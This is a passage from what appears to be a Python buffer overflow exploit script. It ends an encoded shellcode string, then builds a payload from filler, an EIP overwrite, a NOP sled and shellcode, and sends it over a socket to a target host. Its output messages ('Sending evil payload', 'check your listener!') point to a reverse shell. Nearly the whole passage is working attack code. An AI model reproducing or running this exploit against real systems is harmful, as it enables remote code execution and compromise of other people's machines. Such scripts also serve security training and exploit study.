"\xc1\x2e\x5d\x94\x18\xeb\x7d\x77\x88\x06\x16\x2e\x59\xab\x7b"
"\xd1\xb4\xe8\x85\x52\x3c\x91\x71\x4a\x35\x94\x3e\xcc\xa6\xe4"
"\x2f\xb9\xc8\x5b\x4f\xe8")
  buf = filler + eip + offset + nops + shellcode
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host,port))
  print("Sending evil payload")
  s.send(buf)
  print("Done, check your listener!")
except:
  print("Something went wrong")
  sys.exit()
```
